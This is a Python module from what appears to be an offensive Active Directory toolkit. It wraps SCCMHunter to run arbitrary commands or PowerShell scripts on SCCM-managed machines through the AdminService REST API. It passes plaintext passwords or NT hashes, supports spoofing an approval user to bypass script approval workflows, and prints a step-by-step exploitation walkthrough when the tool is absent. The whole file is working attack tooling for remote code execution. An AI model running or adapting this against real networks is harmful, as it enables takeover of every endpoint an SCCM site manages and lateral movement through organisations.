"""SCCM AdminService abuse for command execution via SCCMHunter.

Leverages the SCCM AdminService REST API to execute PowerShell scripts,
deploy applications, or run arbitrary commands on managed SCCM clients.
Requires SCCM Full Administrator privileges (obtained via relay, credential
theft, or legitimate access).

Supports script obfuscation passthrough and optional approval-user spoofing
for environments with script approval workflows.

Source: https://github.com/garrettfoster13/sccmhunter (MIT)
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
from typing import Any


MANIFEST = {
    "capability_id": "adxpl.sccm.sccm_admin.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["remote_code_execution", "sccm_script_deployment"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1072", "T1059.001"],
    "source": "https://github.com/garrettfoster13/sccmhunter",
}


def _find_sccmhunter() -> str | None:
    for name in ("sccmhunter", "sccmhunter.py"):
        path = shutil.which(name)
        if path:
            return path
    for d in ("/opt/tools/sccmhunter", os.path.expanduser("~/tools/sccmhunter")):
        candidate = os.path.join(d, "sccmhunter.py")
        if os.path.isfile(candidate):
            return candidate
    return None


def run(args: Any) -> int:
    """Execute commands on SCCM-managed clients via AdminService.

    Uses the AdminService REST API to deploy and execute scripts or
    applications on target devices managed by SCCM.

    Args:
        args.target: SCCM site server hostname or IP.
        args.domain: AD domain.
        args.device: Target device name in SCCM inventory.
        args.command: Command or script to execute.
        args.script_file: Path to PowerShell script to deploy.
        args.approval_user: Script approval user (for bypass).
    """
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target = getattr(args, "target", None)
    device = getattr(args, "device", None)
    command = getattr(args, "command", None)
    script_file = getattr(args, "script_file", None)
    approval_user = getattr(args, "approval_user", None)

    print("[*] SCCM AdminService Command Execution")
    print(f"[*] Site server: {target}")
    print(f"[*] Domain: {cred.domain}")
    if device:
        print(f"[*] Target device: {device}")

    sccmhunter = _find_sccmhunter()
    if sccmhunter:
        cmd = [sys.executable, sccmhunter, "admin"]
        auth = "{}\\{}".format(cred.domain, cred.username or "")
        cmd.extend(["-u", auth])
        if cred.password:
            cmd.extend(["-p", cred.password])
        elif getattr(cred, "nt_hash", None):
            cmd.extend(["-hashes", ":{}".format(cred.nt_hash)])
        if target:
            cmd.extend(["-target", target])
        if device:
            cmd.extend(["-d", device])
        if command:
            cmd.extend(["-c", command])
        if script_file:
            cmd.extend(["-s", script_file])
        if approval_user:
            cmd.extend(["-au", approval_user])

        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, text=True)
        return result.returncode

    print("[!] sccmhunter not found")
    print()
    print("[*] SCCM AdminService exploitation:")
    print("  1. Authenticate to AdminService REST API:")
    print("     https://SCCM-SERVER/AdminService/wmi/")
    print()
    print("  2. Enumerate managed devices:")
    print("     GET /AdminService/wmi/SMS_R_System")
    print()
    print("  3. Create and approve script:")
    print("     POST /AdminService/wmi/SMS_Scripts")
    print("     Optionally specify approval user to bypass workflow")
    print()
    print("  4. Execute script on target device:")
    print("     POST /AdminService/wmi/SMS_ScriptsInvocation")
    print("     OperationType: RunScript, TargetResourceIDs: [deviceID]")
    print()
    print("  5. Retrieve execution output:")
    print("     GET /AdminService/wmi/SMS_ScriptExecutionResult")
    print()
    print("[*] Install: pip install sccmhunter")
    return 1
